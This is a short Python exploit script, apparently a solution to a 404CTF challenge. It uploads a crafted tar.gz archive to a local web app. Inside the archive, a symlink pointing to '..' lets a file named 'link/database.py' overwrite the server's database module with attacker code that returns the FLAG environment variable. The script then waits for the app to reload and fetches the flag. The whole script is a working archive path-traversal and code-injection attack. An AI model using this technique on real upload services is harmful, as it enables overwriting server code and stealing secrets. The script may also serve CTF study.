#!/usr/bin/env python3
import requests, tarfile, io, time, random, string

URL = "http://localhost:5000"
USER = ''.join(random.choices(string.ascii_lowercase, k=8))

EVIL_DB = b'''import os

def search_comments():
    return [os.environ.get("FLAG", "404CTF{not_found}")], 1

def init_db(): pass
def search_patents(u): return []
def add_patent(u, p): pass
def add_comment(u, p, c): pass
def change_seed(n): pass
'''

s = requests.Session()
s.post(URL + "/", data={"name": USER})

buf = io.BytesIO()
with tarfile.open(fileobj=buf, mode="w:gz") as tar:
    link = tarfile.TarInfo("link")
    link.type = tarfile.SYMTYPE
    link.linkname = ".."
    tar.addfile(link)

    payload = tarfile.TarInfo("link/database.py")
    payload.size = len(EVIL_DB)
    tar.addfile(payload, io.BytesIO(EVIL_DB))

r = s.post(URL + "/post_patent", files={"file": ("patent.tar.gz", buf.getvalue(), "application/gzip")})
print("[upload]", r.status_code, r.text.strip())

print("[*] waiting for the reloader to pick up the new database.py...")
time.sleep(8)

r = s.get(URL + "/comment", params={"name": "x"})
print("[flag]", r.json())
